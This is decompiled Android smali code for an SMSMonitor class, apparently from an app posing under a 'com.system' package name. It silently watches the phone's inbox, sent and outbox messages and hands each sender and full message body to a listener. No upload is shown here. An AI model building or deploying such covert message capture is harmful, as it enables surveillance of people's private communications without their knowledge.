.class public Lcom/system/DroidX/utils/SMSMonitor;
.super Landroid/database/ContentObserver;
.source "SMSMonitor.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/system/DroidX/utils/SMSMonitor$SMSListener;
    }
.end annotation


# instance fields
.field private context:Landroid/content/Context;

.field private lastCheckTime:J

.field private lastMessageId:J

.field private listener:Lcom/system/DroidX/utils/SMSMonitor$SMSListener;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    .line 24
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    invoke-direct {p0, v0}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    const-wide/16 v0, 0x0

    .line 16
    iput-wide v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    .line 17
    iput-wide v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->lastCheckTime:J

    .line 25
    iput-object p1, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    return-void
.end method

.method private checkForNewMessages()V
    .locals 17

    move-object/from16 v1, p0

    .line 87
    const-string v2, "SMSMonitor"

    .line 0
    const-string v0, "Checking for new messages, lastId: "

    .line 87
    :try_start_0
    const-string v3, "content://sms/"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    const/4 v3, 0x5

    .line 88
    new-array v6, v3, [Ljava/lang/String;

    const-string v4, "_id"

    const/4 v10, 0x0

    aput-object v4, v6, v10

    const-string v4, "address"

    const/4 v11, 0x1

    aput-object v4, v6, v11

    const-string v4, "body"

    const/4 v12, 0x2

    aput-object v4, v6, v12

    const-string v4, "type"

    const/4 v13, 0x3

    aput-object v4, v6, v13

    const-string v4, "date"

    const/4 v14, 0x4

    aput-object v4, v6, v14

    .line 89
    const-string v7, "_id > ?"

    .line 90
    new-array v8, v11, [Ljava/lang/String;

    iget-wide v3, v1, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    invoke-static {v3, v4}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v8, v10

    .line 92
    iget-object v3, v1, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v9, "_id ASC"

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_9

    .line 96
    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v4

    .line 97
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-wide v6, v1, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    invoke-virtual {v5, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v5, ", found: "

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-nez v4, :cond_0

    .line 100
    const-string v0, "No new messages found"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 101
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    return-void

    .line 105
    :cond_0
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v4, "yyyy-MM-dd HH:mm:ss"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v5

    invoke-direct {v0, v4, v5}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 107
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_8

    .line 108
    invoke-interface {v3, v10}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    .line 109
    invoke-interface {v3, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 110
    invoke-interface {v3, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 111
    invoke-interface {v3, v13}, Landroid/database/Cursor;->getInt(I)I

    move-result v8

    .line 112
    invoke-interface {v3, v14}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v12

    if-ne v8, v11, :cond_1

    .line 118
    const-string v8, "RECEIVED"

    .line 119
    const-string v16, "\ud83d\udce5"

    :goto_1
    move-object/from16 v9, v16

    const/4 v15, 0x5

    goto :goto_3

    :cond_1
    const/4 v9, 0x2

    if-ne v8, v9, :cond_2

    .line 121
    const-string v8, "SENT"

    .line 122
    const-string v16, "\ud83d\udce4"

    goto :goto_1

    :cond_2
    if-eq v8, v14, :cond_5

    const/4 v9, 0x6

    if-ne v8, v9, :cond_3

    goto :goto_2

    :cond_3
    const/4 v15, 0x5

    if-ne v8, v15, :cond_4

    .line 127
    const-string v8, "FAILED"

    .line 128
    const-string v9, "\u274c"

    goto :goto_3

    .line 130
    :cond_4
    const-string v8, "UNKNOWN"

    .line 131
    const-string v9, "\u2753"

    goto :goto_3

    :cond_5
    :goto_2
    const/4 v15, 0x5

    .line 124
    const-string v8, "SENDING"

    .line 125
    const-string v9, "\u23f3"

    .line 134
    :goto_3
    new-instance v11, Ljava/util/Date;

    invoke-direct {v11, v12, v13}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v0, v11}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v11

    .line 136
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v12, " New SMS detected: "

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v12, " | ID: "

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v12, " | From/To: "

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v12, " | Body: "

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    if-eqz v7, :cond_6

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v12

    const/16 v13, 0x14

    invoke-static {v13, v12}, Ljava/lang/Math;->min(II)I

    move-result v12

    invoke-virtual {v7, v10, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v12

    goto :goto_4

    :cond_6
    const-string v12, "null"

    :goto_4
    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v2, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 138
    iget-object v9, v1, Lcom/system/DroidX/utils/SMSMonitor;->listener:Lcom/system/DroidX/utils/SMSMonitor$SMSListener;

    if-eqz v9, :cond_7

    if-eqz v6, :cond_7

    if-eqz v7, :cond_7

    .line 139
    invoke-interface {v9, v8, v6, v7, v11}, Lcom/system/DroidX/utils/SMSMonitor$SMSListener;->onSMSActivity(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_5

    .line 141
    :cond_7
    const-string v6, "Skipping SMS - listener or data is null"

    invoke-static {v2, v6}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 144
    :goto_5
    iget-wide v6, v1, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    invoke-static {v6, v7, v4, v5}, Ljava/lang/Math;->max(JJ)J

    move-result-wide v4

    iput-wide v4, v1, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    const/4 v11, 0x1

    const/4 v12, 0x2

    const/4 v13, 0x3

    goto/16 :goto_0

    .line 146
    :cond_8
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    .line 147
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Updated lastMessageId to: "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v3, v1, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    invoke-virtual {v0, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_9
    return-void

    :catch_0
    move-exception v0

    .line 150
    const-string v3, "Error checking messages"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 151
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method

.method private getLastMessageId()V
    .locals 8

    .line 72
    :try_start_0
    const-string v0, "content://sms/"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 73
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const/4 v0, 0x1

    new-array v3, v0, [Ljava/lang/String;

    const-string v0, "_id"

    const/4 v7, 0x0

    aput-object v0, v3, v7

    const-string v6, "_id DESC LIMIT 1"

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 76
    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 77
    invoke-interface {v0, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v1

    iput-wide v1, p0, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    .line 78
    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 81
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method


# virtual methods
.method synthetic lambda$onChange$0$com-system-DroidX-utils-SMSMonitor()V
    .locals 2

    .line 0
    const-wide/16 v0, 0x1f4

    .line 62
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 63
    invoke-direct {p0}, Lcom/system/DroidX/utils/SMSMonitor;->checkForNewMessages()V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 65
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    return-void
.end method

.method public onChange(Z)V
    .locals 1

    .line 57
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 58
    const-string p1, "SMSMonitor"

    const-string v0, "SMS database changed - checking for new messages"

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    new-instance p1, Ljava/lang/Thread;

    new-instance v0, Lcom/system/DroidX/utils/SMSMonitor$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0}, Lcom/system/DroidX/utils/SMSMonitor$$ExternalSyntheticLambda0;-><init>(Lcom/system/DroidX/utils/SMSMonitor;)V

    invoke-direct {p1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 67
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public setListener(Lcom/system/DroidX/utils/SMSMonitor$SMSListener;)V
    .locals 0

    .line 30
    iput-object p1, p0, Lcom/system/DroidX/utils/SMSMonitor;->listener:Lcom/system/DroidX/utils/SMSMonitor$SMSListener;

    return-void
.end method

.method public startMonitoring()V
    .locals 4

    .line 34
    invoke-direct {p0}, Lcom/system/DroidX/utils/SMSMonitor;->getLastMessageId()V

    .line 35
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Starting monitoring from message ID: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-wide v1, p0, Lcom/system/DroidX/utils/SMSMonitor;->lastMessageId:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SMSMonitor"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 38
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "content://sms/"

    .line 39
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x1

    .line 38
    invoke-virtual {v0, v2, v3, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 40
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "content://sms/sent"

    .line 41
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 40
    invoke-virtual {v0, v2, v3, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 42
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "content://sms/inbox"

    .line 43
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 42
    invoke-virtual {v0, v2, v3, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 44
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "content://sms/outbox"

    .line 45
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 44
    invoke-virtual {v0, v2, v3, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 47
    const-string v0, "SMS monitoring started - watching all SMS changes (inbox, sent, outbox)"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public stopMonitoring()V
    .locals 2

    .line 51
    const-string v0, "SMSMonitor"

    const-string v1, "Stopping SMS monitoring"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 52
    iget-object v0, p0, Lcom/system/DroidX/utils/SMSMonitor;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    return-void
.end method
